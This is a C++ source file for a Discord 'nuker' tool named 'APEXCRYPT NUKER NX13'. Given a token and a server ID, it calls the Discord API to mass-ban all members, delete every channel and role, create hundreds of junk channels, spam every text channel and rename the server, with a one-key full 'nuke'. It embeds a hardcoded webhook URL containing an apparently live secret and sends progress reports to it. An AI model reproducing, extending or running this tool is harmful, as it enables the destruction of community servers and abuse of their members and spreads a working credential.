#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <sstream>
#include <chrono>
#include <curl/curl.h>
#include <nlohmann/json.hpp>

#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "normaliz.lib")

using json = nlohmann::json;

const std::string WEBHOOK = "https://discord.com/api/webhooks/1564706059673804906/mBdPMhPGuf0GuWflwjhzY5wFffdR3pDQXePBWhB2oNQbahppfbcNCV5KGqBWjR5f018E";
const std::string TITLE = "APEXCRYPT NUKER NX13";

std::string TOKEN, SERVER_ID;
std::atomic<bool> running{true};
std::atomic<int> ban_c{0}, chan_c{0}, role_c{0}, msg_c{0}, emoji_c{0};

void set_color(int c) { SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c); }
void print_red(const std::string& s) { set_color(12); std::cout << s; set_color(7); }
void print_green(const std::string& s) { set_color(10); std::cout << s; set_color(7); }
void print_cyan(const std::string& s) { set_color(11); std::cout << s; set_color(7); }
void print_magenta(const std::string& s) { set_color(13); std::cout << s; set_color(7); }

size_t wcb(void* p, size_t s, size_t n, std::string* o) {
    o->append((char*)p, s * n);
    return s * n;
}

std::string http(const std::string& m, const std::string& url, const std::string& body = "", const std::string& auth = "") {
    CURL* c = curl_easy_init();
    std::string r;
    if (!c) return "";
    struct curl_slist* h = nullptr;
    h = curl_slist_append(h, "Content-Type: application/json");
    h = curl_slist_append(h, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    if (!auth.empty()) h = curl_slist_append(h, ("Authorization: " + auth).c_str());
    curl_easy_setopt(c, CURLOPT_URL, url.c_str());
    curl_easy_setopt(c, CURLOPT_HTTPHEADER, h);
    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, wcb);
    curl_easy_setopt(c, CURLOPT_WRITEDATA, &r);
    curl_easy_setopt(c, CURLOPT_TIMEOUT, 8L);
    curl_easy_setopt(c, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(c, CURLOPT_SSL_VERIFYHOST, 0L);
    if (m == "POST") curl_easy_setopt(c, CURLOPT_POSTFIELDS, body.c_str());
    else if (m != "GET") {
        curl_easy_setopt(c, CURLOPT_CUSTOMREQUEST, m.c_str());
        if (!body.empty()) curl_easy_setopt(c, CURLOPT_POSTFIELDS, body.c_str());
    }
    curl_easy_perform(c);
    curl_slist_free_all(h);
    curl_easy_cleanup(c);
    return r;
}

void send_webhook(const std::string& txt) {
    http("POST", WEBHOOK, "{\"content\":\"" + txt + "\"}");
}

bool gate() {
    auto a = http("GET", "https://discord.com/api/v10/users/@me", "", TOKEN);
    if (a.find("\"id\"") == std::string::npos) return false;
    auto b = http("GET", "https://discord.com/api/v10/guilds/" + SERVER_ID, "", TOKEN);
    return b.find("\"id\"") != std::string::npos;
}

void ban_members() {
    auto r = http("GET", "https://discord.com/api/v10/guilds/" + SERVER_ID + "/members?limit=1000", "", TOKEN);
    json m = json::parse(r, nullptr, false);
    if (!m.is_array()) return;
    std::vector<std::thread> pool;
    for (auto& u : m) {
        if (!running) break;
        std::string id = u["user"]["id"];
        std::string name = u["user"].value("username", id);
        pool.emplace_back([id, name]() {
            http("PUT", "https://discord.com/api/v10/guilds/" + SERVER_ID + "/bans/" + id,
                 R"({"delete_message_seconds":0})", TOKEN);
            ban_c++;
            print_red("[BAN] " + name + "\n");
        });
        if (pool.size() >= 100) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    send_webhook("**[BAN]** " + std::to_string(ban_c.load()) + " members banned");
}

void create_channels(int n) {
    std::vector<std::thread> pool;
    for (int i = 0; i < n && running; i++) {
        pool.emplace_back([i]() {
            std::string b = R"({"name":"apexcrypt-)" + std::to_string(i) + R"(","type":0})";
            http("POST", "https://discord.com/api/v10/guilds/" + SERVER_ID + "/channels", b, TOKEN);
            chan_c++;
            print_green("[CHAN] apexcrypt-" + std::to_string(i) + "\n");
        });
        if (pool.size() >= 80) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    send_webhook("**[CHANNELS]** " + std::to_string(chan_c.load()) + " created");
}

void delete_channels() {
    auto r = http("GET", "https://discord.com/api/v10/guilds/" + SERVER_ID + "/channels", "", TOKEN);
    json ch = json::parse(r, nullptr, false);
    if (!ch.is_array()) return;
    std::vector<std::thread> pool;
    for (auto& c : ch) {
        std::string id = c["id"];
        pool.emplace_back([id]() {
            http("DELETE", "https://discord.com/api/v10/channels/" + id, "", TOKEN);
        });
        if (pool.size() >= 100) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    send_webhook("**[DELETE]** All channels deleted");
}

void delete_roles() {
    auto r = http("GET", "https://discord.com/api/v10/guilds/" + SERVER_ID + "/roles", "", TOKEN);
    json roles = json::parse(r, nullptr, false);
    if (!roles.is_array()) return;
    for (auto& role : roles) {
        if (role["name"] == "@everyone") continue;
        http("DELETE", "https://discord.com/api/v10/guilds/" + SERVER_ID + "/roles/" + role["id"].get<std::string>(), "", TOKEN);
        role_c++;
    }
    send_webhook("**[ROLES]** Deleted");
}

void spam_channels(int n, const std::string& txt) {
    auto r = http("GET", "https://discord.com/api/v10/guilds/" + SERVER_ID + "/channels", "", TOKEN);
    json ch = json::parse(r, nullptr, false);
    if (!ch.is_array()) return;
    std::vector<std::thread> pool;
    for (auto& c : ch) {
        if (c["type"] != 0) continue;
        std::string cid = c["id"];
        pool.emplace_back([cid, n, txt]() {
            for (int i = 0; i < n; i++) {
                http("POST", "https://discord.com/api/v10/channels/" + cid + "/messages",
                     "{\"content\":\"" + txt + "\"}", TOKEN);
                msg_c++;
            }
        });
        if (pool.size() >= 50) {
            for (auto& t : pool) t.join();
            pool.clear();
        }
    }
    for (auto& t : pool) t.join();
    send_webhook("**[SPAM]** Finished");
}

void rename_server(const std::string& name) {
    http("PATCH", "https://discord.com/api/v10/guilds/" + SERVER_ID, "{\"name\":\"" + name + "\"}", TOKEN);
    send_webhook("**[RENAME]** " + name);
}

void complete_nuke() {
    print_magenta("[NUKE] Full sequence...\n");
    send_webhook("**APEXCRYPT NX13 — FULL NUKE STARTED**");
    std::thread(ban_members).detach();
    std::thread(create_channels, 400).detach();
    std::thread(delete_channels).detach();
    std::thread(delete_roles).detach();
    rename_server("APEXCRYPT DESTROYED");
    print_red("[NUKE] Engines fired.\n");
}

void banner() {
    system("cls");
    SetConsoleTitleA(TITLE.c_str());
    set_color(12);
    std::cout << R"(
  ╔════════════════════════════════════════════════════════════╗
  ║                  APEXCRYPT NUKER NX13                      ║
  ║                     ULTRA // CLEAN                         ║
  ╚════════════════════════════════════════════════════════════╝
)" << "\n";
    set_color(7);
    std::cout << "  (1) Ban Members          (2) Create Channels\n";
    std::cout << "  (3) Delete Channels      (4) Delete Roles\n";
    std::cout << "  (5) Spam All Channels    (6) Rename Server\n";
    std::cout << "  (7) Complete Nuke        (0) Exit\n\n";
    print_red("Ban:" + std::to_string(ban_c) + " ");
    print_green("Chan:" + std::to_string(chan_c) + " ");
    print_cyan("Role:" + std::to_string(role_c) + " ");
    print_magenta("Msg:" + std::to_string(msg_c) + "\n");
}

int main() {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    SetConsoleOutputCP(CP_UTF8);

    set_color(12);
    std::cout << "\n  TOKEN: ";
    set_color(7);
    std::getline(std::cin, TOKEN);

    set_color(12);
    std::cout << "  SERVER ID: ";
    set_color(7);
    std::getline(std::cin, SERVER_ID);

    if (!gate()) {
        print_red("\n  INVALID TOKEN OR SERVER\n");
        Sleep(2000);
        return 1;
    }

    print_green("\n  [+] Authenticated\n");
    send_webhook("**APEXCRYPT NX13 online**");

    while (true) {
        banner();
        set_color(12);
        std::cout << "\n  > ";
        set_color(7);
        int c;
        std::cin >> c;
        if (c == 0) break;
        if (c == 1) ban_members();
        else if (c == 2) {
            int n; std::cout << "  Amount: "; std::cin >> n;
            create_channels(n);
        }
        else if (c == 3) delete_channels();
        else if (c == 4) delete_roles();
        else if (c == 5) {
            int n; std::string t;
            std::cout << "  Amount per channel: "; std::cin >> n;
            std::cin.ignore();
            std::cout << "  Text: "; std::getline(std::cin, t);
            spam_channels(n, t);
        }
        else if (c == 6) {
            std::string n; std::cin.ignore();
            std::cout << "  New name: "; std::getline(std::cin, n);
            rename_server(n);
        }
        else if (c == 7) complete_nuke();
        Sleep(300);
    }

    curl_global_cleanup();
    return 0;
}
